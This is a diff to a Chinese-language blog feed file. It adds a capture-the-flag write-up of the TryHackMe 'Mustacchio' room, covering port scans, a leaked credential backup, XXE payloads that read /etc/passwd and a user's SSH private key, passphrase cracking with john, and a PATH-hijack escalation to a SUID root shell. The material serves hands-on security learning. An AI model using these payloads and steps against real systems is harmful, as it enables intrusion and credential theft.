@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>打靶记录(一零八)之THMMustacchio</title>
+      <link href="/2024/03/18/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E9%9B%B6%E5%85%AB)%E4%B9%8BTHMMustacchio/"/>
+      <url>/2024/03/18/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E9%9B%B6%E5%85%AB)%E4%B9%8BTHMMustacchio/</url>
+      
+        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap --min-rate=10000 -p- 10.10.155.198</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 08:34 UTC</span><br><span class="line">Nmap scan report for ip-10-10-240-97.eu-west-1.compute.internal (10.10.155.198)</span><br><span class="line">Host is up (0.0038s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8765/tcp open  ultraseek-http</span><br><span class="line">MAC Address: 02:3D:37:D2:CB:0F (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sC -sT -sV -O -p22,80,8765 10.10.155.198</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 08:35 UTC</span><br><span class="line">Nmap scan report for ip-10-10-240-97.eu-west-1.compute.internal (10.10.155.198)</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 581b0c0ffacf05be4cc07af1f188611c (RSA)</span><br><span class="line">|   256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA)</span><br><span class="line">|_  256 9d59c6c779c554c41daae4d184710192 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Mustacchio | Home</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">8765/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Mustacchio | Login</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">MAC Address: 02:3D:37:D2:CB:0F (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (97%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.40 seconds</span><br></pre></td></tr></tbody></table></figure><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>80端口只是一个门户网站，感觉什么功能都没有，扫描一下目录</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">feroxbuster -u http://10.10.155.198/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x rar,zip,sql,txt,jsp,php,html,bak</span><br></pre></td></tr></tbody></table></figure><p>发现一个 <a href="http://10.10.155.198/custom/js/users.bak">http://10.10.155.198/custom/js/users.bak</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mv users.bak users.sqlite3</span><br></pre></td></tr></tbody></table></figure><p>用sqlite3打开，得到凭据:</p><p>admin:bulldog19</p><p>在8765端口的登录界面可以成功登录,在源码中发现注释</p><!-- Barry, you can now SSH in using your key!--><p>除此之外还有一个/auth/dontforget.bak，里面有下载查看,是一个xml文件</p><p>并且可以上传一个POST表单，名为xml，根据房间提示可以XXE，上payloadAllThing找一段payload</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span><br><span class="line">&lt;comment&gt;</span><br><span class="line">  &lt;com&gt;&amp;xxe;&lt;/com&gt;</span><br><span class="line">&lt;/comment&gt;</span><br></pre></td></tr></tbody></table></figure><p>发现能够回显!尝试获取barry的私钥</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" &gt;]&gt;</span><br><span class="line">&lt;comment&gt;</span><br><span class="line">  &lt;com&gt;&amp;xxe;&lt;/com&gt;</span><br><span class="line">&lt;/comment&gt;</span><br></pre></td></tr></tbody></table></figure><p>保存，给予权限尝试连接，但是发现需要密码</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ssh2john key &gt;hash</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">urieljames       (key)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-03-18 11:54) 1.250g/s 3713Kp/s 3713Kc/s 3713KC/s urieljr.k..urielfabricio07</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></tbody></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在joe的家目录发现一个/home/joe/live_log，并有suid位，放到ida反编译</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  printf("Live Nginx Log Reader");</span><br><span class="line">  return system("tail -f /var/log/nginx/access.log");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>相对路径调用了tail,劫持一个</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">echo 'cp /bin/bash /tmp/rootbash ;chmod +xs /tmp/rootbash' &gt;tail</span><br><span class="line">chmod +x tail</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></tbody></table></figure><p>再次运行，我们是root!</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>第一次接触xxe,虽然只是抄了一段payload,似乎要学习XML中的DTD,有空看一下</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>tmux</title>
       <link href="/2024/03/18/tmux/"/>
       <url>/2024/03/18/tmux/</url>
@@ -22,9 +53,9 @@
             
             <tag> 网安 </tag>
             
-            <tag> 工具 </tag>
-            
             <tag> 笔记 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
